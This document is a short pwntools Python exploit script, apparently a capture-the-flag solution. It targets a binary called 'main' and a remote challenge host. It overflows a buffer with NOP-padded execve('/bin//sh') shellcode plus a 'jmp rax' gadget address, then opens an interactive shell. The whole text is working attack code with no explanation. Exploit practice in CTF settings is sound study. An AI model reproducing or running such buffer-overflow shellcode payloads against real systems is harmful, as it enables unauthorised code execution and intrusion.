from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./main")

def start():
    if args.REMOTE:
        return remote("chals.bitskrieg.in", 6001)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

offset = 120

jmp_rax = 0x00000000004010ac

shellcode = """
    xor rsi,rsi
	push rsi
	mov rdi,0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	push 59
	pop rax
	cdq
	syscall
"""

payload = b"".join([
    asm(shellcode).ljust(offset, asm("nop")),
    p64(jmp_rax)
])

io.send(payload)

io.interactive()